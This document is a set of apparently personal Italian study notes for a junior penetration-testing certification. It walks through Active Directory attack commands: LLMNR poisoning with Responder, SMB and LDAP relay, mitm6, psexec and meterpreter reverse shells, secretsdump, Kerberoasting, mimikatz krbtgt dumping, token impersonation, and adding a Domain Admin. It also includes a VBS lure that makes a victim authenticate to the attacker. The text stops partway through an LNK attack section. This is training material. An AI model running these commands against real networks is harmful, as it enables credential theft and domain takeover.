<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PJPT notes</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MyOtherNotesFor PJPT</h1><br/><p>I contenuti di queste pagine sono i miei appunti in preparazione all&#39;esame di certificazione <strong>PJPT</strong> (Practical Junior Penetration Tester) della <strong>TCM Security</strong>.</p><p></p><p>La prima parte è dedicata interamente ai contenuti del PEH (Practical Ethical Hacking) course, relativamente alla sezione Attacking AD (oggetto specifico d&#39;esame);</p><p>La seconda parte è una integrazione utile, sempre ai fini dell&#39;esame: rappresenta una raccolta di diverse risorse interessantissime tratte da ottime fonti online;</p></div>
</body>
</html>

<!doctype html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Sintesi AD dal PEH</title>
    <meta name="generator" content="CherryTree">
    <link rel="stylesheet" href="res/styles4.css" type="text/css" />
  </head>
  <body>
    <div class='page'>
      <h1 class='title'>Sintesi AD dal PEH</h1><br />
      <p>
      <ol>
        <li><strong><span style="color:#071ba3;">LLMNR poisoning</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>L&#39;attacco LLMNR Poisoning consiste nello sfruttare il protocollo Link-Local Multicast Name Resolution (LLMNR) per intercettare e manipolare richieste di risoluzione di nomi, inducendo un client a inviare credenziali NTLM all&#39;attaccante.</em></p>
      <p></p>
      <p><em>Avviamo Reponder </em></p>
      <p><span style="color:#ff0000;">sudo responder -I INTERFACE -dwPv</span></p>
      <p></p>
      <p>(N.B. probabilmente nella verione attuale, le flag -w e -P sono incompatibili. Possiamo tranquillamente eseguire <span style="color:#ff0000;">-dwv</span>)</p>
      <p></p>
      <p><em>Intercettato l&#39;hash, usiamo hashcat</em><em>per crackarlo:</em></p>
      <p><span style="color:#ff0000;"> hashcat -m 5600 hashes.txt rockyou.txt</span></p>
      <p></p>
      <p><em>5600 è in base alla versione del NTLM</em> (<span style="color:#ff0000;">hashcat --help | grep NTML</span>)</p>
      <p></p>
      <p><em>Si possono aggiungere</em><span style="color:#ff0000;">--forced</span><em>(per forzare) oppure</em><span style="color:#ff0000;">-O</span><em>(per ottimizzare)</em></p>
      <p></p>
      <p><em>Perché l&#39;attacco funzioni, deve essere generato un certo tipo di traffico in rete (nel corso PEH, abbiamo fatto il login nella macchina target, aperto il file manager, e cercato di connetterci alla nostra macchina attaccante</em> → <em>il punto non è però cercare di collegarsi al nostro indirizzo ip - nessuno lo farà mai... Il punto è causare un evento che generi un name resolution lookup. La mancanza di quel “name” nell&#39;arp table, genererà un arp request (broadcast) all&#39;intera rete. Responder è lì pronto sulla nostra macchina, in ascolto, e risponderà alla richiesta! Questo è l&#39;LLMNR poisoning)</em>.</p>
      <p></p>
      <p><em>Es: un utente, invece che connettersi a </em>\\DATI<em>, cerca di connettersi a </em>\\DATA <em>per errore di battitura</em> → <em>il tentativo di connessione darà errore, ma al contempo genererà un evento che verrà intercettato da Responder. Automaticamente si otterrà l&#39;hash dell&#39;utente. </em></p>
      <p></p>
      <p><em>Se e quando possibile (non sempre il Rules of Engagment lo permette) potremmo usare un metodo che sfrutta l&#39;ingegneria sociale → si può ottenere lo stesso effetto ed intercettare l&#39;hash della password attraverso il prompt dei comandi di windows, eseguento il comando</em>:</p>
      <p></p>
      <p><span style="color:#ff0000;">net use \\NOSTRO-IP</span></p>
      <p></p>
      <p><em>(equivale ad aprire il file manager e inserire il nostro indirizzo nella barra degli indirizzi). È quindi possibile cercare di “forzare” con l&#39;astuzia un utente ad eseguire questo comando, magari attraverso un file batch o vbs. Un esempio di script vbs</em><em>(da salvare poi con estensione .vbs)</em>:</p>
      <p>_________________________________________________</p>
      <p><span style="color:#000000;">|</span><span style="color:#ff0000;"> Set objShell = CreateObject(&quot;WScript.Shell&quot;) </span><span style="color:#000000;">|</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#000000;">|</span><span style="color:#ff0000;"> objShell.Run &quot;cmd.exe /c net use \\192.168.1.2&quot;, 0, True</span> |</p>
      <p>|_________________________________________________|</p>
      <p>
      <ol>
        <li>2) <strong><span style="color:#071ba3;">2) SMB Relay attack</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>L&#39;SMB Relay Attack è un attacco man-in-the-middle che utilizza credenziali NTLM catturate per autenticarsi su un server SMB di destinazione.</em></p>
      <p></p>
      <p><em>Per vedere se il target è vulnerabile a questo attacco, usiamo nmap:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">nmap --script=smb2-security-mode.nse -Pn -p445 IP</span></p>
      <p></p>
      <p><em>(Se non ci ricordiamo lo script, possiamo usare -sC di nmap. Tuttavia è preferibile lo script specifico per causare meno “rumore”).</em></p>
      <p></p>
      <p><em>Se il target è vulnerabile creiamo un file .txt con gli ip dei target vulnerabili;</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Andiamo nel file di configurazione di Responder: </em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo nano /etc/responder/Responder.conf</span></p>
      <p></p>
      <p><em>Modifichiamo le voci SMB e HTTP mettendole on ad off</em></p>
      <p></p>
      <p><em>Avviamo responder:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo responder -I INTERFACCIA -dwPv</span> (<em>probabilmente w e P nella nuova versione sono incompatibili)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Avviamo in un&#39;altra tab ntlmrelayx (di impacket)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em></em><span style="color:#ff0000;">sudo ntlmrelayx.py -tf FILE.txt -smb2support</span></p>
      <p></p>
      <p><em>e attendiamo di intercettare del traffico (nel corso abbiamo fatto il login in una macchina target, aperto il File Manager, e prodotto traffico cercando di collegarci alla nostra macchina attacker)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Se vogliamo una modalità interattiva con una shell, basta che aggiungiamo -i alla fine del comando, e in un&#39;altra tab ci colleghiamo con netcat all&#39;indirizzo indicato:</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em></em><span style="color:#ff0000;">sudo ntlmrelayx.py -tf FILE.txt -smb2support -i</span></p>
      <p></p>
      <p><span style="color:#ff0000;">nc IP PORT</span><em></em></p>
      <p><em></em></p>
      <p>
      <ol>
        <li>3) <em><strong><span style="color:#071ba3;">3) </span></strong></em><em>Se abbiamo ottenuto delle credenziali, possiamo </em><em><strong><span style="color:#071ba3;">ottenere una shell </span></strong></em><em>in due modi:</em></li>
      </ol><em></em></p>
      <p><em></em>
      <ol>
        <li><em>Tramite </em><em><span style="color:#071ba3;">Metasploit</span></em><em>:</em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">sudo msfconsole</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">search psexec</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">use exploit/windows/smb/psexec</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set payload windows/x64/meterpreter/reverse_tcp</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set rhosts IP-TARGET</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set smbdomain DOMAIN.local</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set smbuser USER</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">set smbpass PASSWORD (O HASH)</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">run</span></p>
      <p></p>
      <p><em>possiamo provare anche mettendo “administrator” come smbuser (e non so per quale motivo, nel corso viene eseguito unset smbdomain prima di eseguire run).</em></p>
      <p>
      <ol>
        <li> 2- <em> 2- Manualmente tramite </em><em><span style="color:#071ba3;">psexec </span></em><em>(di impacket):</em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">psexec.py DOMAIN/user:PASSWORD@IP</span> → <em>Nella verisione attuale il comando è</em><span style="color:#ff0000;">impacket-psexec DOMAIN/user:PASSWORD@IP</span></p>
      <p></p>
      <p><em>(potremmo anche non mettere “:password,” e lo script ce la chiederebbe dopo aver premuto invio)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Possiamo anche usare l&#39;hash al posto della password:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">psexec.py user@IP -hashes HASH</span></p>
      <p></p>
      <p><em>se abbiamo l&#39;hash dell&#39;amministratore possiamo eseguire:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">psexec.py administrator@IP -hashes HASH</span></p>
      <p></p>
      <p>-----------------------------------------------------------------------------------------------------------------------------------------------------
      <ol>
        <li>4) <strong><span style="color:#071ba3;">4) mitm6 attack</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>Questo attacco sfrutta il fatto che ancora oggi è largamente utilizzato IPv4, anche quando IPv6 è attivato.</em><em></em></p>
      <p><em>La domanda è: chi fa da DNS all&#39;IPv6 quando viene usato principalmente il v4?</em><em></em></p>
      <p><em>In genere... NESSUNO </em><em></em></p>
      <p><em></em>
      <ul>
        <li><em>Possiamo fare un DNS spoofing, e usare la nostra macchina attaccante come DNS a cui verrà inviato il traffico.</em></li>
      </ul><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Se funziona... Possiamo autenticarci al Domain Controller.</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>L&#39;attacco è il mitm6:</em><em></em></p>
      <p><em>Aspettiamo che qualcuno si logghi nel Netwok. Quando accade, il login arriva a noi nella forma di NTLM (LDAP Relay) → possiamo quindi loggarci al DC con il login ricevuto e, se l&#39;utente intercettato è amministratore, possiamo anche crearci un account.</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>(Attacco ancora oggi largamente undetected)</em></p>
      <p></p>
      <p><span style="color:#ff0000;">ntlmrelayx.py -6 -t ldaps://IP -wh fakewpad.DOMAIN.local -l NOME_CARTELLA</span></p>
      <p></p>
      <p>(Nella versione attuale il comando è <span style="color:#ff0000;">impacket-ntlmrelayx -6 -t ldaps://IP -wh fakewpad.DOMAIN.local -l NOME_CARTELLA</span>)</p>
      <p>In un&#39;altra scheda eseguiamo:</p>
      <p></p>
      <p><span style="color:#ff0000;">sudo mitm6 -d DOMAIN.local</span></p>
      <p></p>
      <p><em>Attendiamo che qualcuno entri in rete: questo attacco è consigliabile farlo negli orari consoni (per esempio la mattina), e non deve essere effettuato per più di 10 minuti o potrebbe causare danni.</em><em></em></p>
      <p><em>(Nel corso ci siamo disconnessi e riconnessi effettuando il login in una delle macchine target per simulare l&#39;ingresso in rete)</em></p>
      <p><em>Il nome-cartella nel corso era &quot;lootme&quot;</em>.</p>
      <p></p>
      <p><em>Se l&#39;attacco va a buon fine, entriamo nella cartella creata e troveremo moltissime informazioni interessanti.</em><em></em></p>
      <p><em>Es:</em></p>
      <p><img src="images/126-1.png" alt="images/126-1.png" /></p>
      <p></p>
      <p>Se a fare il login è l&#39;amministratore (nel corso abbiamo simulato il suo login), viene automaticamente creato un nuovo utente con password e privilegi. Es:</p>
      <p><img src="images/126-2.png" alt="images/126-2.png" /></p>
      <p></p>
      <p>-----------------------------------------------------------------------------------------------------------------------------------------
      <ol>
        <li>5) <strong><span style="color:#071ba3;">5) Passback attack </span></strong></li>
      </ol>
      </p>
      <p></p>
      <p>L&#39;attacco alle periferiche multifunzione (come le stampanti) a volte è sottovalutato, ma spesso è efficacissimo.</p>
      <p>Un tool utile a tal proposito:</p>
      <p><a href="https://github.com/RUB-NDS/PRET">https://github.com/RUB-NDS/PRET</a></p>
      <p></p>
      <p>Guida al passback attack:</p>
      <p> a) Cercare di entrare nell&#39;EWS (Embedded Web Service, in altre parole, l&#39;home page della stampante) → Spesso vengono lasciate le credenziali di default (facilmente recuperabili via internet);</p>
      <p> b) Modificare le impostazioni del server LDAP, inserendo, al posto del server legittimo, il nostro indirizzo IP;</p>
      <p> c) Avviare un listener con netcat;</p>
      <p> c) La prossima volta che verrà eseguita una query LDAP dall&#39;MFP, questa tenterà di autenticarsi al tuo server LDAP utilizzando le credenziali configurate o le credenziali fornite dall&#39;utente;</p>
      <p> Es:</p>
      <p><img src="images/126-3.png" alt="images/126-3.png" /></p>
      <p></p>
      <p> Per l&#39;attacco abbiamo utilizzato LDAP, ma potenzialmente potremmo utilizzare anche le impostazioni di accesso a Windows (Sostituiamo il dominio esistente con il nostro dominio e la volta successiva che un utente del dominio accede al pannello di controllo, le credenziali vengono inviate al nostro controller di dominio), o le impostazioni SMTP (La configurazione SMTP esistente per questa MFP ha archiviato credenziali per l&#39;autenticazione SMTP che possono essere passate a noi, dopo aver sostituito il server SMTP esistente con il nostro server SMTP).</p>
      <p></p>
      <p></p>
      <p> ------------------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p></p>
      <p><span style="color:#071ba3;">Se siamo riusciti a compromettere almeno un utente, passiamo alla </span><strong><span style="color:#071ba3;">post-exploitation enumeration.</span></strong></p>
      <p>
      <ol>
        <li>1) <strong><span style="color:#071ba3;">1) ldapdomaindump</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p>C<em>reiamo innanzitutto una cartella (possiamo dare il nome che vogliamo, nel corso abbiamo dato alla cartella il nome del dominio da compromettere) ed entriamo nella nuova cartella per eseguire ldapdomaindump.</em></p>
      <p></p>
      <p><span style="color:#ff0000;">mkdir marvel.local </span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">cd marvel.local</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">sudo ldapdomaindump ldaps://IP-TARGET -u ‘DOMAIN\user’ -p PASSWORD</span></p>
      <p></p>
      <p><em>Andando a vedere nella cartella, troveremo una serie di info interessanti da ispezionare.</em><em></em></p>
      <p><em>Es:</em></p>
      <p></p>
      <p><img src="images/126-4.png" alt="images/126-4.png" /></p>
      <p></p>
      <p><img src="images/126-5.png" alt="images/126-5.png" /></p>
      <p></p>
      <p>
      <ol>
        <li>2) <strong><span style="color:#071ba3;">2) Bloodhound</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>Se non l&#39;abbiamo già fatto, installiamo bloodhound con:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo pip install bloodhound</span></p>
      <p></p>
      <p><em>Avviamo quindi la neo4j console con:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo neo4j console</span></p>
      <p></p>
      <p><em>Apriamo il browser e andiamo su:</em></p>
      <p><a href="http://localhost:7474/">http://localhost:7474/</a></p>
      <p></p>
      <p><em>(username “neo4j” e, al primo accesso, la password è “neo4j” --&gt; ci verrà chiesto di cambiarla)</em></p>
      <p></p>
      <p><em>A questo punto possiamo avviare bloodhound:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo bloodhound</span></p>
      <p></p>
      <p><em>Accediamo con neo4j come utente e la nuova password settata come password.</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Al momento risulta tutto vuoto, perché ancora non abbiamo dati. </em><em></em></p>
      <p><em>Creiamo una cartella (possiamo chiamarla “bloodhound”), entriamo, e, iniziamo ad enumerare (e quindi a generare i dati da visualizzare) con bloodhound eseguendo il comando:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo bloodhound-python -d DOMAIN.local -u user -p PASSWORD -ns NAME-SERVER-IP -c all</span></p>
      <p></p>
      <p><em>Dove:</em><em></em></p>
      <p><em>-d domain</em><em></em></p>
      <p><em>-u username</em><em></em></p>
      <p><em>-p password</em><em></em></p>
      <p><em>-ns name server</em>
      <ul>
        <li><em>c collecting</em></li>
      </ul>
      </p>
      <p></p>
      <p><em>Nella cartella troveremo i file che ci interessano, risultato dell&#39;enumeration. Es:</em></p>
      <p></p>
      <p><img src="images/126-6.png" alt="images/126-6.png" /></p>
      <p></p>
      <p><em>Importiamo i dati in bloodhound con il pulsante “upload data” sulla destra:</em></p>
      <p></p>
      <p><img src="images/126-7.png" alt="images/126-7.png" /></p>
      <p></p>
      <p><em>Possiamo iniziare ad analizzare i dati. Es:</em></p>
      <p></p>
      <p><img src="images/126-8.png" alt="images/126-8.png" /></p>
      <p></p>
      <p><img src="images/126-9.png" alt="images/126-9.png" /></p>
      <p></p>
      <p><img src="images/126-10.png" alt="images/126-10.png" /></p>
      <p>
      <ol>
        <li>3) <strong><span style="color:#071ba3;">3) Plumhound</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>Bloodhound deve essere aperto e attivo assieme a neo4j </em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Effettuiamo una prima prova per il funzionamento con:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo python3 PlumHound.py --easy -p NEO4jPASSWORD</span></p>
      <p></p>
      <p><em>(su -p dobbiamo inserire la password precedentemente creata per neo4j)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Se tutto funziona correttamente possiamo avviare il task (ve ne sono diversi, ma quello di default va benissimo ai fini del corso):</em></p>
      <p></p>
      <p><span style="color:#ff0000;">sudo python3 PlumHound.py -x tasks/default.tasks -p NEO4JPASSWORD</span></p>
      <p></p>
      <p><em>Verrà creato un report all&#39;interno di una cartella chiamata “reports”.</em></p>
      <p><img src="images/126-11.png" alt="images/126-11.png" /></p>
      <p></p>
      <p>Assieme alla cartella .zip troviamo anche una serie di file. A noi interessa il file “index.html”. Lo apriamo:</p>
      <p></p>
      <p><span style="color:#ff0000;">firefox index.html</span></p>
      <p></p>
      <p>E troveremo il full report con tutti i dettagli. Es:</p>
      <p></p>
      <p><img src="images/126-12.png" alt="images/126-12.png" /></p>
      <p></p>
      <p><img src="images/126-13.png" alt="images/126-13.png" /></p>
      <p></p>
      <p></p>
      <p><img src="images/126-14.png" alt="images/126-14.png" /></p>
      <p></p>
      <p>
      <ol>
        <li>4) <strong><span style="color:#071ba3;">4) pingcastle</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>Software gratuito che può essere scaricato e avviato per un vulnerability assessment di AD. </em><em></em></p>
      <p><em>Ci basterà quindi scaricarlo e avviarlo:</em></p>
      <p><a href="https://www.pingcastle.com/download/">https://www.pingcastle.com/download/</a></p>
      <p></p>
      <p>--------------------------------------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">PASS ATTACKS (Pass the password/Pass the hash) --&gt; for lateral movement</span></strong></p>
      <p>
      <ol>
        <li>1) <strong><span style="color:#071ba3;">1) crackmapexec</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">crackmapexec smb IP-RANGE -u USER -d DOMAIN.local -p PASSWORD</span></p>
      <p></p>
      <p><em>Es:</em></p>
      <p><img src="images/126-15.png" alt="images/126-15.png" /></p>
      <p></p>
      <p><em>Se non abbiamo la Password, usiamo l&#39;hash con la flag </em>-H.</p>
      <p><em>Se abbiamo l&#39;hash dell&#39;administrator per esempio, lo copiamo:</em></p>
      <p></p>
      <p><img src="images/126-16.png" alt="images/126-16.png" /></p>
      <p></p>
      <p><em>Ed eseguiamo il seguente comando:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">crackmapexec smb IP-RANGE -u administrator -H HASH --local-auth</span></p>
      <p></p>
      <p><em>Se vogliamo il sam dump, possiamo eseguire:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">crackmapexec smb IP-RANGE -u administrator -H HASH --local-auth --sam</span></p>
      <p></p>
      <p><em>Se vogliamo enumerare gli shares:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">crackmapexec smb IP-RANGE -u administrator -H HASH --local-auth --shares</span></p>
      <p></p>
      <p><em>(Gli shares sono quelli disponibili, non quelli a cui siamo connessi)</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>A questo punto possiamo eseguire il seguente comando (fantastico):</em></p>
      <p></p>
      <p><span style="color:#ff0000;">crackmapexec smb IP-RANGE -u administrator -H HASH --local-auth --lsa</span></p>
      <p></p>
      <p><em>Per esempio possiamo provare a crackare alcuni hash. Es:</em></p>
      <p><img src="images/126-17.png" alt="images/126-17.png" /></p>
      <p></p>
      <p><em>crackmapexec, con smb, è dotato di una serie di moduli. Per elencarli eseguiamo:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">crackmapexec smb -L</span></p>
      <p></p>
      <p><em>Per utilizzare un modulo, basta aggiungere la flag -M NOME_MODULO al nostro comando.</em><em></em></p>
      <p><em>Tra tutti i moduli, quello che più è stato inneggiato nel corso PEH è il modulo lsassy:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">crackmapexec smb IP-RANGE -u administrator -H HASH --local-auth -M lsassy</span></p>
      <p></p>
      <p>Crackmapexec è, infine, dotato di un suo database, che raccoglie tutte le discoveries. Possiamo accedere al database con:</p>
      <p></p>
      <p><span style="color:#ff0000;">cmedb</span></p>
      <p></p>
      <p><img src="images/126-18.png" alt="images/126-18.png" /></p>
      <p></p>
      <p>Per vedere gli hosts:</p>
      <p><span style="color:#ff0000;">hosts</span></p>
      <p><img src="images/126-19.png" alt="images/126-19.png" /></p>
      <p></p>
      <p>Per vedere le credenziali scoperte:</p>
      <p><span style="color:#ff0000;">creds</span></p>
      <p></p>
      <p><img src="images/126-20.png" alt="images/126-20.png" /></p>
      <p></p>
      <p>---------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">DUMPING AND CRACKING HASHES</span></strong></p>
      <p>
      <ol>
        <li>1) <strong><span style="color:#071ba3;">1) secretsdump.py (per il dumping)</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">secretsdumpy.py DOMAIN.local/user:&#39;PASSWORD&#39;@IP</span></p>
      <p></p>
      <p>(Nella versione attuale, il comando è<span style="color:#ff0000;"> impacket-secretsdump DOMAIN.local/user:&#39;PASSWORD&#39;@IP</span>)</p>
      <p></p>
      <p><em>Possiamo effettuare la stessa operazione per ogni macchina target che abbiamo a disposizione.</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Anche in questo caso, si può usare l&#39;hash invece della psswd e puntare all&#39;admin se abbiamo l&#39;hash:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">secretsdump.py administrator@IP -hashes HASH</span></p>
      <p></p>
      <p></p>
      <p>Un&#39;ottimo iter da seguire potrebbe essere questa sequenza di attacco che comprende l&#39;utilizzo di secretsdump dopo aver trovato un login valido (nell&#39;esempio “fcastle”):</p>
      <p><img src="images/126-21.png" alt="images/126-21.png" /></p>
      <p>
      <ol>
        <li>2) <strong><span style="color:#071ba3;">2) hashcat (per il cracking)</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>Creiamo un file txt con l&#39;hash.</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Cerchiamo NTLM in hashcat col seguente comando:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">hashcat --help | grep NTLM</span></p>
      <p><img src="images/126-22.png" alt="images/126-22.png" /></p>
      <p></p>
      <p><em>In questo caso specifico ci interessa il 1000. Come wordlist possiamo usare rockyou.txt.</em><em></em></p>
      <p><em>Eseguiamo il comando:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt</span></p>
      <p></p>
      <p>-------------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">KERBEROASTING</span></strong><strong><span style="color:#071ba3;"></span></strong></p>
      <p><strong><span style="color:#071ba3;"></span></strong>
      <ol>
        <li><strong><span style="color:#071ba3;">GetUserSPNs.py</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">sudo GetUserSPNs.py DOMAIN.local/user:PASSWORD -dc-ip IP -request</span></p>
      <p></p>
      <p>(<em>Nell&#39;attuale versione il comando è</em><span style="color:#ff0000;">impacket-GetUserSPNs</span><span style="color:#ff0000;">DOMAIN.local/user:PASSWORD -dc-ip IP -request</span>)</p>
      <p></p>
      <p><em>Riceveremo come output un grande hash da crackare con hashcat. In questo caso il modulo è il 13100:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span></p>
      <p>
      <ol>
        <li>2) <strong><span style="color:#071ba3;">2) mimikatz</span></strong></li>
      </ol>
      </p>
      <p></p>
      <p><em>Dopo aver scaricato mimikatz, se abbiamo la possibilità di esguirlo sulla macchina target utilizziamo i seguenti comandi:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">mimikatz.exe</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">privilege::debug</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;">lsadump::lsa /inject /name:krbtgt</span></p>
      <p></p>
      <p><img src="images/126-23.png" alt="images/126-23.png" /></p>
      <p></p>
      <p>------------------------------------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">TOKEN IMPERSONATION</span></strong></p>
      <p></p>
      <p><em>Usiamo metasploit (msfconsole) sebbene vi siano anche altri tool disponibili</em></p>
      <p>
      <ol>
        <li>1) <em><span style="color:#071ba3;">1) Cerchiamo il modulo psexec</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">search psexec</span></p>
      <p></p>
      <p><em>e usiamo il modulo exploit/windows/smb/psexec</em></p>
      <p></p>
      <p><span style="color:#ff0000;">use exploit/windows/smb/psexec</span></p>
      <p>
      <ol>
        <li>2) <em><span style="color:#071ba3;">2) Inseriamo le impostazioni:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;"> set payload windows/x64/meterpreter/reverce_tcp</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"> set rhosts IP_TARGET </span><em><span style="color:#000000;">→ la macchina deve essere attiva</span></em><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"> set smbuser UTENTE</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"> set smbpass PASSWORD</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"> set smbdomain DOMAIN → A meno che non stiamo accedendo come amministratori, allora lasciamo ‘.’</span><span style="color:#ff0000;"></span></p>
      <p><span style="color:#ff0000;"> run</span></p>
      <p></p>
      <p><em>Abbiamo la reverse_shell (meterpreter)</em></p>
      <p>
      <ol>
        <li>3) <span style="color:#071ba3;">3) Eseguiamo →</span><span style="color:#ff0000;">load incognito</span></li>
      </ol>
      </p>
      <p></p>
      <p>Facendo <span style="color:#ff0000;">help</span>, vediamo i comandi incognito:</p>
      <p><img src="images/126-24.png" alt="images/126-24.png" /></p>
      <p>
      <ol>
        <li>4) <span style="color:#071ba3;">4) </span><em><span style="color:#071ba3;">Per esempio:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">list_tokens -u</span></p>
      <p></p>
      <p><span style="color:#ff0000;">impersonate_token DOMAIN\\user</span></p>
      <p></p>
      <p>(facendo <span style="color:#ff0000;">shell</span>, scopriamo di essere quell&#39;utente)</p>
      <p></p>
      <p>Per tornare all&#39;inizio: </p>
      <p></p>
      <p><span style="color:#ff0000;">rev2self</span></p>
      <p></p>
      <p>(<em>vediamo anche load TAB TAB per vedere tutte le possibilità interessanti oltre a incognito)</em></p>
      <p>
      <ol>
        <li>5) <em><span style="color:#071ba3;">5) Proviamo a fare il login con la macchina Administrator</span></em></li>
      </ol><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Tornando sul meterpreter, eseguiamo nuovamente</em></p>
      <p></p>
      <p><span style="color:#ff0000;">list_tokens -u</span></p>
      <p></p>
      <p><em>Troveremo anche DOMAIN\Administrator</em><em></em></p>
      <p><em></em><em></em></p>
      <p><em>Eseguiamo:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">impersonate_token DOMAIN\Administrator</span></p>
      <p></p>
      <p><em>siamo entrati con Amministratori (lo capiamo eseguendo</em><span style="color:#ff0000;">shell</span>)</p>
      <p>
      <ol>
        <li><em><span style="color:#071ba3;">Essendo Administrator, aperta la shell, possiamo creare un nuovo utente! Usiamo questo comando</span></em><em>:</em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">net user /add NEW_USER_NAME PASSWORD /domain</span></p>
      <p></p>
      <p><em>Abbiamo creato e aggiunto il nuovo utente hawkeye al domain</em></p>
      <p>
      <ol>
        <li><em><span style="color:#071ba3;">Per aggiungere il nuovo utente creato al gruppo “Domain Admins”:</span></em></li>
      </ol>
      </p>
      <p></p>
      <p><span style="color:#ff0000;">net group “Domain Admins” NEW_USER_NAME /ADD /DOMAIN</span></p>
      <p></p>
      <p><em>Per averne la conferma, eseguiamo:</em></p>
      <p></p>
      <p><span style="color:#ff0000;">secretsdump.py DOMAIN.local/NEW_USER_NAME:PASSWORD@IP</span></p>
      <p></p>
      <p>(<em>nella versione attuale, il comando è</em><span style="color:#ff0000;">impacket-secretsdump DOMAIN.local/NEW_USER_NAME:PASSWORD@IP</span>)</p>
      <p></p>
      <p>-----------------------------------------------------------------------------------------------------------</p>
      <p><strong><span style="color:#071ba3;">LNK file attack</span></strong></p>
      <p></p>
      <p><em>L&#39;attacco è da effettuare se siamo riusciti ad ottenere una shell in una macchina target di un utente nel domain ed è eseguibile nel caso vi sia una cartella condivisa in rete.</em><em></em></p>
      <p><em></em>
      <ol>
        <li><em>1) </em><em><span style="color:#071ba3;">1) Attraverso la shell, eseguiamo</span></em><em></em><span style="color:#ff0000;">powershell</span></li>
      </ol><em></em></p>
      <p><em></em>
      <ol>
